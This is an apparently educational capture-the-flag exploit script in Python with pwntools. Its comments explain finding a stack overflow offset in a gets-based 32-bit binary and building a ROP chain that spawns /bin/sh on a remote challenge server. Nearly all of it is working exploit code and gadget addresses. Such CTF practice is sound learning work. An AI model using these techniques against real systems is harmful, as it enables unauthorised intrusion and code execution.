#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# When opening this binary in binary ninja, there are way more functions than normal,
# which suggests that we might not need to use libc. The program itself simply calls
# gets on my input. Running this in gdb and passing in a cyclic sequence of length
# 300, it displays 'Invalid address 0x61616165'. Using cyclic -l '0x61616165', we can
# see the offset is 16. Hence, this is where we want to place our payload.

# In our payload, we want to construct a ROP chain using gadgets in the binary to
# run the command execve("/bin/sh", NULL, NULL). Using shellcode, we would do:
'''
mov eax, 11
mov ebx, "/bin/sh"
xor ecx, ecx
xor edx, edx
int 0x80
'''

# If we wanted to place a value in register ebx (like the string "/bin/sh" in this
# example), we would do pop ebx. However, remember that pop takes the next 4 bytes off 
# the stack and places it into the register. Hence, we cannot pop the 8 byte string
# "/bin//sh" into register ebx.

# However, we notice in gdb that after gets returns, it places the start of our
# buffer (which is part of the cyclic sequence created by flat) into the eax register.
# Hence, we can simply place '/bin/sh\x00' at the start of our buffer, and then using
# gadgets find a way to move it from eax to ebx. NOTE: It's important not to forget 
# the null terminator '\x00' at the end of the string, as without it it will think 
# it's an address rather than a string.

# NOTE: if a gadget's address contains a newline, you cannot use it in your ROP chain
# as gets will stop reading in your payload. For eaxmple, the gadget 'pop eax; ret;' 
# has address 0x080a8cb6, and 0a is a newline.

# The script:
p = remote("plsdonthaq.me", 6002)

# Using ropper, we were able to find the following gadgets that we can use to
# construct a ROP chain in our payload.
mov_edi_eax = 0x0806af9d
mov_edx_edi = 0x0809c216
mov_ebx_edx = 0x0806d956
pop_edx = 0x0806eb8b
xor_eax_eax = 0x08056200
inc_eax = 0x0807c01a
xor_ecx_ecx_int_80 = 0x0806ef51

# Now we can construct our ROP chain. Since the string '/bin/sh\x00' is stored in
# register eax, we move it from eax to ebx by chaining the following gadgets:
# eax -> edi -> edx -> ebx
# After this, we simply setup the other registers for execve("/bin/sh", NULL, NULL).
payload = (
    p32(mov_edi_eax) + # mov edi, eax; mov esi, edx; mov eax, dword ptr [esp + 4]; ret;
    p32(mov_edx_edi) + # mov edx, edi; pop esi; pop edi; pop ebp; ret;
    p32(0) +
    p32(0) +
    p32(0) +
    p32(mov_ebx_edx) + # mov ebx, edx; cmp eax, 0xfffff001; jae 0x290c0; ret;
    p32(pop_edx) + # pop edx; ret;
    p32(0) +
    p32(xor_eax_eax) + # xor eax, eax; ret;
    p32(inc_eax)*11 + # inc eax; ret;
    p32(xor_ecx_ecx_int_80) # xor ecx, ecx; int 0x80;
)
 
# We then send the string "/bin/sh\x00" at the start of the buffer, and then our
# payload at offset 16, which is where the return address is located.
p.sendline(flat({
 0: b"/bin/sh\x00",
 16: payload
}))

# Now we have shell access, we can view the flag.
p.interactive()